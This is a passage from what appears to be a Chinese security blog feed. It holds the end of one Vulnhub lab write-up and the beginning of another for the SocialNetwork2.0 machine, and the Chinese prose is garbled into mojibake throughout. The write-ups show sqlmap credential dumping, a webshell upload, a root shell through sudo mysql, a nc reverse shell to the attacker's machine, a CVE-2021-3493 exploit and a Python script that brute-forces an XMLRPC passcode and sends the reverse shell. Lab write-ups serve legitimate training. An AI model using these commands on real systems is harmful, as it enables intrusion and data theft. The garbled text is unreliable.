<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦è¿›è¡Œshellå‡çº§ï¼Œå¦åˆ™æ— æ³•è¯¥ä»£ç ï¼Œç”¨èšå‰‘è¿æ¥ã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2>
<p>å‘ç°äº†<code>/home</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ªç”¨æˆ· wpadmin</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193944.png" /></p>
<p>å¹¶ä¸”åœ¨wpadminçš„ç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼ŒçŒœæµ‹è¿™å°±æ˜¯flagæ–‡ä»¶ï¼Œä½†ç»è¿‡æµ‹è¯•ï¼Œç°åœ¨çš„æƒé™ä¸å¤ŸæŸ¥çœ‹ã€‚</p>
<p>è¿˜åœ¨<code>/root</code>ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œè¿™åº”è¯¥æ˜¯å¦ä¸€ä¸ªflagæ–‡ä»¶ï¼Œä½†é—æ†¾çš„æ˜¯ï¼Œè¿˜æ˜¯æ²¡æœ‰æƒé™ã€‚</p>
<p>æŸ¥çœ‹ç”¨æˆ·<code>cat /etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194131.png" /></p>
<p>æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸<code>uname -a</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194203.png" /></p>
<p>æŸ¥çœ‹sudoé…ç½®ï¼Œå‘ç°æƒé™ä¸å¤Ÿã€‚</p>
<p>æŸ¥çœ‹wordpressç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194406.png" /></p>
<p>å‘ç°äº†æ•°æ®åº“çš„åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>ä¿¡æ¯æ”¶é›†å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦è¿›è¡Œææƒäº†ã€‚</p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
<h3 id="wpadminæƒé™">wpadminæƒé™</h3>
<p>æƒ³èµ·åˆšåˆšæŸ¥çœ‹wordpressé…ç½®æ–‡ä»¶çš„æ—¶å€™å‘ç°äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œå› æ­¤å°è¯•ç™»å½•wpadminè¯•è¯•ï¼Œå°è¯•å¤±è´¥ã€‚è¿™æ—¶å€™æƒ³åˆ°ï¼Œåˆšåˆšå¯†ç çˆ†ç ´è¿˜æœ‰ä¸€ä¸ªå¯†ç ï¼Œå› æ­¤å†æ¬¡å°è¯•ï¼Œå‘ç°æˆåŠŸã€‚å¯†ç æ˜¯ï¼šadam14</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195257.png" /></p>
<p>æ­¤æ—¶å¯ä»¥å…ˆè¯»å–ç¬¬ä¸€ä¸ªflag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195341.png" /></p>
<h3 id="rootæƒé™">rootæƒé™</h3>
<p>ï¼ˆå¦‚æœåˆšåˆšæ²¡æœ‰å‡çº§shellï¼Œè¿™é‡Œæ— æ³•è¿æ¥æ•°æ®åº“ï¼ï¼ï¼ï¼‰ åˆšåˆšå‘ç°å¾—åˆ°äº†ç³»ç»Ÿå†…æ ¸ï¼Œç”¨msfæŸ¥æ‰¾ï¼Œå‘ç°æ²¡æœ‰æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>æ¥ä¸‹æ¥æŸ¥çœ‹sudoé…ç½® <code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
<p>å‘ç°ï¼Œwpadminå¯ä»¥ä»¥rootæƒé™å¯åŠ¨æ•°æ®åº“ï¼Œå› æ­¤ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤å¯åŠ¨æ•°æ®åº“ï¼Œç»è¿‡å°è¯•ï¼Œå¯†ç ä¹Ÿæ˜¯adam14ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
<p>æˆåŠŸç™»å½•æ•°æ®åº“ã€‚</p>
<blockquote>
<p>å°çŸ¥è¯†ï¼šæ•°æ®åº“å¯ä»¥åˆ©ç”¨ system cmd æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚è¿™é‡Œæˆ‘ä»¬æ˜¯ä»¥rootæ–¹å¼å¯åŠ¨çš„æ•°æ®åº“ï¼Œå› æ­¤ä½¿ç”¨systemæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¹Ÿæ˜¯rootæƒé™ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
<p>æ‰§è¡Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i è¡¨ç¤ºshellè¡¨ç¤ºbashæ˜¯äº¤äº’çš„ã€‚å…¶å®è¿™é‡Œä¸åŠ ä¹Ÿæ²¡å…³ç³»</span><br></pre></td></tr></table></figure></p>
<p>è·å¾—rootæƒé™çš„shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
<p>æˆåŠŸæ‹¿åˆ°flagï¼Œä¹ŸæˆåŠŸå¾—åˆ°rootæƒé™ã€‚è‡³æ­¤ï¼Œè¿™ä¸ªé¶æœºç»“æŸï¼</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡å¯¹è¯¥é¶æœºçš„æ¸—é€ï¼Œå­¦åˆ°äº†MySQLçš„ææƒæ–¹å¼ï¼Œå¯¹è¯¥é¶æœºæ¥è¯´ï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯sudoé…ç½®ä¸å½“ã€‚</p>
<p>å…¶æ¬¡ï¼ŒçŸ¥é“äº†å¦‚æœè¯·æ±‚ä¸€ä¸ªç½‘é¡µååº”æ…¢ï¼Œå¯èƒ½æ˜¯å› ä¸ºåå°æºç è¯·æ±‚æŸä¸ªIPåœ°å€ï¼Œè¯¥IPåœ°å€åœ¨åŸæ¥çš„ç¯å¢ƒä¸‹æ˜¯é¶æœºçš„IPå†…ç½‘IPåœ°å€ï¼Œæ‰€ä»¥åœ¨åŸæ¥çš„ç¯å¢ƒä¸‹è¯·æ±‚é€Ÿåº¦æ­£å¸¸ï¼Œä½†æ˜¯ä¸€æ—¦ç§»æ¤åˆ°è‡ªå·±çš„ç¯å¢ƒï¼Œæ¯”å¦‚è™šæ‹Ÿæœºï¼Œé‚£ä¹ˆå°±ä¼šå‡ºé—®é¢˜ã€‚æ­¤æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨BPçš„è‡ªåŠ¨æ›¿æ¢ï¼Œå°†ä»£ç ä¸­å†™æ­»çš„IPåœ°å€æ”¹ä¸ºå½“å‰é¶æœºçš„IPåœ°å€ã€‚</p>
<p>æœ€åï¼Œå°±æ˜¯å­¦ä¹ äº†å¦‚ä½•å°†â€œæ®‹ç¼ºçš„â€shellå‡çº§ä¸ºäº¤äº’å¼çš„shellã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>MySQLæå–</tag>
        <tag>shellå‡çº§</tag>
        <tag>BPè‡ªåŠ¨æ›¿æ¢</tag>
      </tags>
  </entry>
  <entry>
    <title>5. Vulvhub SocialNetwork2.0 Writeup</title>
    <url>/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦å›°éš¾ï¼Œæ¶‰åŠåˆ°é€†å‘ï¼ˆä¸ä¼šï¼ï¼‰ã€‚è¿™ä¸ªé¶æœºçš„éš¾ç‚¹å°±æ˜¯åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/">social_network_2.0</a></p>
<p>éš¾åº¦ï¼šHard</p>
<p>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVirtual Box</p>
<p>ç›®æ ‡ï¼šè·å¾—rootæƒé™</p>
<p><strong>æ¶‰åŠçš„æ”»å‡»æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>SQLæ³¨å…¥</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>èšå‰‘ä¸Šçº¿</li>
<li>CVEåˆ©ç”¨</li>
<li><strong>XMLRPCå‘½ä»¤æ‰§è¡Œ</strong></li>
<li><strong>åŠ¨æ€è°ƒè¯•</strong></li>
<li><strong>æ¼æ´åˆ©ç”¨ä»£ç ç¼–å†™</strong></li>
</ul>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>kaliï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
<p>é¶æœºIPä¸ºï¼š10.0.2.8</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
<p>é¶æœºå¼€äº†2ä¸ªç«¯å£ï¼š80ï¼Œ8000</p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
<ol type="1">
<li>80å’Œ8000ç«¯å£çš„æœåŠ¡éƒ½æ˜¯http</li>
<li>é¶æœºç³»ç»Ÿæ˜¯Ubuntu</li>
<li>80ç«¯å£ä¸Šçš„CMSæ˜¯Apacheï¼Œç‰ˆæœ¬ä¸º2.4.29</li>
<li>8000ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯BaseHTTPServerï¼Œç‰ˆæœ¬ä¸º0.3</li>
<li>é¶æœºä¸Šæœ‰python2çš„ç¯å¢ƒ</li>
</ol>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>é¦–å…ˆè®¿é—®8000ç«¯å£ï¼Œå‘ç°æç¤ºä¿¡æ¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
<p>ç®€è€Œè¨€ä¹‹å°±æ˜¯æœåŠ¡ç«¯ä¸æ¥å—GETè¯·æ±‚æ–¹å¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ¢è¯·æ±‚æ–¹å¼ï¼Œä½†æ˜¯åœ¨å°è¯•äº†æ‰€æœ‰è¯·æ±‚æ–¹å¼åå‘ç°éƒ½ä¸è¡Œã€‚è¿™ä¸ªç«¯å£çš„æ€è·¯åˆ°æ­¤å°±æ–­äº†ã€‚</p>
<p>é‚£è®¿é—®80ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
<p>é¦–å…ˆå°è¯•ä¸‡èƒ½å¯†ç ï¼Œä½†è¢«æç¤º<code>invalid email format</code>ã€‚å› æ­¤ï¼Œå°±éœ€è¦æ¢ä¸€ä¸ªæ€è·¯ã€‚<strong>æ³¨æ„åˆ°è¯¥ç½‘å€æœ‰ä¸€ä¸ª<code>Sign Up</code>åŠŸèƒ½ï¼Œå› æ­¤ï¼Œæ¥ä¸‹æ¥åº”è¯¥å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åæ”¶é›†ç™»é™†è¿›å»çš„ä¿¡æ¯</strong>ã€‚è¿™æ˜¯éå¸¸é‡è¦çš„æ€è·¯ï¼</p>
<p>è¿›å»ä¹‹åå‘ç°è¿™æ˜¯ä¸€ä¸ªç±»ä¼¼å¾®åšä¸€æ ·çš„åŠŸèƒ½ï¼Œæ³¨æ„åˆ°é™¤äº†æˆ‘ä¹‹å¤–è¿˜æœ‰ä¸¤ä¸ªç”¨æˆ·<code>admin admin</code> å’Œ<code>testuser testuers</code>ã€‚è¿˜æ³¨æ„åˆ°æœ‰ä¸€ä¸ª<strong>æœç´¢æ¡†</strong>ä»¥åŠå¤´åƒå¯ä»¥<strong>ä¸Šä¼ æ–‡ä»¶</strong>ï¼</p>
<h2 id="èšå‰‘ä¸Šçº¿">èšå‰‘ä¸Šçº¿</h2>
<p>å…ˆæµ‹è¯•ä¸Šä¼ æ–‡ä»¶åŠŸèƒ½ç‚¹ã€‚ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯ï¼Œç„¶åé¼ æ ‡å³é”®å¤´åƒï¼Œæ‰“å¼€é“¾æ¥ï¼Œå‘ç°æˆåŠŸæ‰“å¼€ï¼Œå¹¶ä¸”å¾—åˆ°æ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205340.png" /></p>
<p>ç›´æ¥ä½¿ç”¨èšå‰‘è¿æ¥ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205811.png" /></p>
<h2 id="sqlæ³¨å…¥">SQLæ³¨å…¥</h2>
<p>æµ‹è¯•åˆšåˆšé‚£ä¸ªæœç´¢æ¡†ï¼Œå…ˆè¾“å…¥ä¸€ä¸ªå•å¼•å·ï¼Œå‘ç°æŠ¥é”™äº†ï¼Œå› æ­¤ï¼Œå­˜åœ¨SQLæ³¨å…¥ï¼Œå¹¶ä¸”æ•°æ®åº“ä¸ºMySQL</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
<p>ç›´æ¥ç”¨sqlmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># å…¶ä¸­r.txtä¿å­˜çš„æ˜¯æœç´¢çš„è¯·æ±‚æ•°æ®åŒ…</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
<p>æˆåŠŸè·å¾—é‚®ç®±å’Œå¯†ç çš„hashå€¼ï¼Œä¸€èˆ¬å¯†ç éƒ½æ˜¯md5åŠ å¯†çš„ï¼Œå› æ­¤è§£å¯†ä¹‹åå¾—åˆ°ä¸‹è¡¨ï¼š</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">email</th>
<th style="text-align: center;">encryPasswd</th>
<th style="text-align: center;">passwd</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>admin@localhost.com</code></td>
<td style="text-align: center;">21232f297a57a5a743894a0e4a801fc3</td>
<td style="text-align: center;">admin</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>21232f297a57a5a743894a0e4a801fc3</code></td>
<td style="text-align: center;">5d9c68c6c50ed3d02a2fcf54f63993b6</td>
<td style="text-align: center;">testuser</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>hdfzzf@123.com</code></td>
<td style="text-align: center;">249abd700757d98f77fa6ff4f0c2a750</td>
<td style="text-align: center;">hdfzzf</td>
</tr>
</tbody>
</table>
<p>æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨adminçš„é‚®ç®±å’Œå¯†ç ç™»å½•ã€‚</p>
<p>å‘ç°ä¸€æ¡é¶æœºç³»ç»Ÿä¸Šæœ‰ä¸€ä¸ª<code>monitor.py</code>è„šæœ¬ã€‚å…¶ä»–å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ã€‚</p>
<h2 id="åå¼¹shell">åå¼¹shell</h2>
<p>èšå‰‘è·å¾—çš„shellåŠŸèƒ½ä¸å¤Ÿï¼Œå› æ­¤éœ€è¦ç”¨ncåå¼¹æˆ–è€…pythonï¼Œç„¶åè¿›è¡Œshellå‡çº§ã€‚</p>
<p>kaliå…ˆç›‘å¬3333ç«¯å£ï¼Œç„¶åèšå‰‘shellä¸Šæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åè¿›è¡Œshellå‡çº§ï¼Œå’Œä¹‹å‰ä¸€æ ·ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°</p>
<h2 id="cve-2021-3493ææƒ">CVE-2021-3493ææƒ</h2>
<p>Ubuntuæœ‰ä¸€ä¸ªCVE-2021-3493ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæœ¬åœ°ææƒã€‚</p>
<p>æ¼æ´åˆ©ç”¨ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
<p>ä¸‹è½½å®Œä¹‹åï¼Œç¼–è¯‘ä¹‹åå‘é€åˆ°é¶æœºã€‚ç„¶åå†æ‰§è¡Œè¯¥expå³å¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214049.png" /></p>
<p>æˆåŠŸææƒã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
<p>è¿™æ ·å­ä¼¼ä¹å¾ˆå¿«ï¼Œä½†æ˜¯è¿™å°é¶æœºæ˜¯2020å¹´å‡ºçš„ï¼Œè€Œè¯¥æ¼æ´æ˜¯2021å¹´çˆ†å‡ºçš„ï¼Œå› æ­¤ï¼Œå›å½’å½“å¹´çš„ç¯å¢ƒï¼Œç”¨åˆ«çš„æ–¹æ³•ææƒã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2>
<p>ä¸‹é¢å‘½ä»¤å¯ä»¥è·å¾—å…·ä½“å‘è¡Œç‰ˆæœ¬ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
<p>å‘ç°ä¸<code>/bin/bahs</code>æœ‰å…³çš„ç”¨æˆ·ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
<p>å‘ç°ä¸¤ä¸ªç”¨æˆ·ã€‚è¿™é‡Œå…¶ä»–ä¿¡æ¯æ”¶é›†çš„è¿‡ç¨‹å°±ä¸å¤šèµ˜è¿°äº†ã€‚</p>
<p>è®°å¾—åˆšåˆšæœ‰ä¸€ä¸ªè„šæœ¬<code>monitor.py</code>ï¼Œåœ¨<code>/home/socnet</code>ç›®å½•ä¸‹æ‰¾åˆ°äº†å®ƒï¼ŒæŸ¥çœ‹æºç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæŠ€æœ¯ï¼š<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
<p>ï¼ˆè¿™ä¸ªè„šæœ¬ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨è®¿é—®8000ç«¯å£çš„æ—¶å€™ä¸æ¥å—æ‰€æœ‰çš„è¯·æ±‚æ–¹å¼ï¼ï¼‰</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¯¥æŠ€æœ¯è°ƒç”¨æœåŠ¡ç«¯æä¾›çš„å‡½æ•°ã€‚è€ŒæŸ¥çœ‹è¿›ç¨‹å‘ç°ï¼Œè¯¥è„šæœ¬å¤„äºè¿è¡ŒçŠ¶æ€ã€‚é€šè¿‡ä»£ç å®¡è®¡å‘ç°ï¼Œé¶æœºä½œä¸ºæœåŠ¡ç«¯å¯åŠ¨æœåŠ¡ï¼Œå¹¶ä¸”æœ‰å¤šä¸ªå‡½æ•°ï¼Œæ³¨æ„åˆ°æœ€åä¸€ä¸ª<code>secure_cmd</code>ï¼Œåªè¦æ»¡è¶³æ¡ä»¶ï¼Œå°±èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚æˆ‘ä»¬å¹¶ä¸çŸ¥é“<code>debugging_pass</code>å€¼æ˜¯å¤šå°‘ï¼Œè¿™æ˜¯é€šè¿‡éšæœºå‡½æ•°åœ¨è„šæœ¬åˆšæ‰§è¡Œæ—¶éšæœºçš„ä¸€ä¸ªå€¼ï¼Œä½†æ˜¯ä¹Ÿå°±å‡ åƒä¸ªï¼Œç›´æ¥çˆ†ç ´å³å¯ã€‚</p>
<h2 id="ç¬¬ä¸€æ¬¡æƒé™æå‡xmlrpcå‘½ä»¤æ‰§è¡Œ">ç¬¬ä¸€æ¬¡æƒé™æå‡â€”â€”XMLRPCå‘½ä»¤æ‰§è¡Œ</h2>
<p>ç¼–å†™å¦‚ä¸‹è„šæœ¬çˆ†ç ´<code>debugging_pass</code>ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
<p>å¾—åˆ°<code>debugging_pass=5166</code>ï¼Œå¹¶ä¸”å‘ç°æ‰§è¡Œçš„ç»“æœæ˜¯<code>socnet</code>ã€‚å¦‚æœåˆ©ç”¨è¯¥è„šæœ¬åå¼¹shellï¼Œé‚£ä¹ˆè·å¾—çš„shellå°±æ˜¯<code>socnet</code>çš„ã€‚</p>
<p>æ­¤æ—¶å†æ¬¡æ‰§è¡Œncåå¼¹ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
<p>æˆåŠŸææƒåˆ°<code>socnet</code>ã€‚ç„¶åå†æ¬¡è¿›è¡Œshellå‡çº§ã€‚</p>
<h2 id="ç¬¬äºŒæ¬¡æƒé™æå‡ç¼“å­˜åŒºæº¢å‡ºæ¼æ´">ç¬¬äºŒæ¬¡æƒé™æå‡â€”â€”ç¼“å­˜åŒºæº¢å‡ºæ¼æ´</h2>
<p>é¦–å…ˆï¼Œåœ¨<code>socnet</code>çš„å®¶ç›®å½•ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼ˆç›®å½•ï¼‰ï¼Œå¹¶ä¸”<code>add_record</code>å…·æœ‰SUIDï¼Œæ‰€æœ‰è€…ä¸ºrootã€‚å› æ­¤ï¼Œæƒ³åŠæ³•é€šè¿‡è¯¥å¯æ‰§è¡Œæ–‡ä»¶è·å¾—rootæƒé™ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405223223.png" /></p>
<p>æ³¨æ„åˆ°<code>peda</code>ï¼Œè¿™æ˜¯ä¸€æ¬¾åŠ¨æ€è°ƒè¯•çš„å·¥å…·ã€‚<a href="https://www.jianshu.com/p/283b5466684b">pedaä¿¡æ¯</a></p>
<p>æ€è·¯ï¼šåŠ¨æ€è°ƒè¯•<code>add_record</code>ï¼Œæ‰¾åˆ°ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨æ¼æ´</p>
<h3 id="åŠ¨æ€è°ƒè¯•">åŠ¨æ€è°ƒè¯•</h3>
<p>é¦–å…ˆæ‰§è¡Œè¯¥ç¨‹åºï¼Œå‘ç°éœ€è¦ä¾æ¬¡å¡«å†™å¤šä¸ªä¿¡æ¯ï¼š</p>
<ol type="1">
<li>Employee Name</li>
<li>Years worked</li>
<li>Salary</li>
<li>Ever got in trouble?</li>
